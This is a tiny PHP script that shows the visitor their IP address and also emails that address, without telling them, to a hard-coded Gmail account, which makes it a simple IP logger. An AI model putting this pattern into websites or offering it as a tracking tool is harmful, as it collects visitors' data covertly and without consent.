<?php 
 $ipaddress = getenv("REMOTE_ADDR") ; 
 Echo "Your IP Address is " . $ipaddress; 
 mail("r8s8a8m8@gmail.com","My subject",$ipaddress);
?> 
